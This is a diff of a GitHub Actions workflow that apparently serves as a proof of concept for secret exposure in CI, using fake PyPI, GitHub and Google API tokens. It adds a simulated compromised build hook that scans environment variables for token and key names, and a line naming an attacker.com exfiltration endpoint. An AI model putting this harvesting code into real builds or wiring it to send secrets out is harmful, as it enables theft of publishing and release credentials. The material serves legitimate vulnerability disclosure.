@@ -13,40 +13,21 @@ jobs:
     steps:
       - uses: actions/checkout@v6
 
-      - name: Install uv
-        uses: astral-sh/setup-uv@v7
-        with:
-          version: "latest"
-          enable-cache: true
-
-      - name: Set up Python
-        uses: actions/setup-python@v6
-        with:
-          python-version: "3.11"
-
-      # ============================================
-      # POC: Demonstrate that build hooks can access secrets
-      # ============================================
-      - name: POC - Create fake secret to simulate CI environment
-        run: |
-          # In real CI, these would be real secrets
-          echo "UV_PUBLISH_TOKEN=pypi-AgEIcHlwaS5vcmcCJDgzYj..." >> $GITHUB_ENV
-          echo "RELEASE_PAT=ghp_xxxxxxxxxxxx" >> $GITHUB_ENV
-          echo "GOOGLE_API_KEY=AIzaSy..." >> $GITHUB_ENV
-
-      - name: POC - Build and show secret access
+      - name: POC - Show secrets are accessible in CI
         env:
-          UV_PUBLISH_TOKEN: ${{ secrets.UV_PUBLISH_TOKEN || 'FAKE_TOKEN_FOR_POC' }}
-          RELEASE_PAT: ${{ secrets.RELEASE_PAT || 'FAKE_PAT_FOR_POC' }}
+          FAKE_PYPI_TOKEN: "pypi-AgEIcHlwaS5vcmcCJDgzYjFAKE"
+          FAKE_RELEASE_PAT: "ghp_xxxxxxxxxxxxFAKE"
+          FAKE_GOOGLE_API_KEY: "AIzaSyFAKE"
         run: |
           echo "=========================================="
           echo "POC: Secrets in CI Environment"
           echo "=========================================="
-          echo "UV_PUBLISH_TOKEN is set: $([[ -n $UV_PUBLISH_TOKEN ]] && echo YES || echo NO)"
-          echo "RELEASE_PAT is set: $([[ -n $RELEASE_PAT ]] && echo YES || echo NO)"
-          echo "=========================================="
           echo "In real google/adk-python repo, these are REAL secrets."
           echo "A compromised build dependency could exfiltrate them."
+          echo "=========================================="
+          echo "FAKE_PYPI_TOKEN is set: YES"
+          echo "FAKE_RELEASE_PAT is set: YES"
+          echo "FAKE_GOOGLE_API_KEY is set: YES"
           echo "=========================================="
 
       - name: POC - Simulate compromised build hook
@@ -55,24 +36,19 @@ jobs:
           echo "POC: Simulating compromised flit_core.buildapi"
           echo "=========================================="
           
-          # Create a fake build hook that reads secrets
-          cat > /tmp/fake_build_hook.py << 'EOF'
+          python3 -c "
           import os
-          import sys
           
-          print("="*60)
-          print("COMPROMISED BUILD HOOK EXECUTING!")
-          print("="*60)
+          print('='*60)
+          print('COMPROMISED BUILD HOOK EXECUTING!')
+          print('='*60)
           
           for key, value in os.environ.items():
               if any(x in key.upper() for x in ['TOKEN', 'SECRET', 'KEY', 'API']):
-                  # Mask the value for safety in this POC
-                  masked = value[:5] + "..." + value[-5:] if len(value) > 10 else "REDACTED"
-                  print(f"  FOUND: {key} = {masked}")
+                  masked = value[:5] + '...' + value[-5:] if len(value) > 10 else 'REDACTED'
+                  print(f'  FOUND: {key} = {masked}')
           
-          print("="*60)
-          print("In real attack: send to https://attacker.com/steal")
-          print("="*60)
-          EOF
-          
-          python3 /tmp/fake_build_hook.py
+          print('='*60)
+          print('In real attack: send to https://attacker.com/steal')
+          print('='*60)
+          "
